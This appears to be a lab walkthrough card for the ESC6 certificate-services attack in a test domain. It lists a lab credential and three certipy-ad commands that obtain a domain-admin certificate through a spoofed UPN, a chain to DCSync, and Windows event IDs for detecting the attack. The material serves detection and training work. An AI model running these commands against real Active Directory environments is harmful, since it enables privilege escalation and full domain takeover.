# WT#054 — ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | User (default) |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | certipy-ad |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1649 |
| **Difficulty** | Medium |

## Prerequisites
- CA service running on dc01
- `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set on cadre-CA
- `analyst_dfir` has Enroll on any published template (e.g., `User`)

## Attack Steps

### 1. Check CA flag
```powershell
certipy-ad ca -ca cadre-CA -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 2. Request certificate with SAN via `-attrib`
Any published template can be abused when `EDITF_ATTRIBUTESUBJECTALTNAME2` is enabled:
```powershell
certipy-ad req -ca cadre-CA -template User -upn chief_command@cadre.local -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 3. Authenticate as DA
```powershell
certipy-ad auth -pfx chief_command.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

## Post-Exploitation Chain
ESC6 → CA-level SAN bypass → DA certificate → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **Event 4887**: Certificate enrollment against `User` template with embedded SAN
- **Event 4889**: Certificate issued with alternate UPN in SAN
- **Event 4688**: certipy-ad.exe execution
- **CA setting check**: `certutil -config "cadre.local\cadre-CA" -getreg policy\EditFlags` shows `EDITF_ATTRIBUTESUBJECTALTNAME2`
## Status
CONFIGURED — ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on cadre-CA
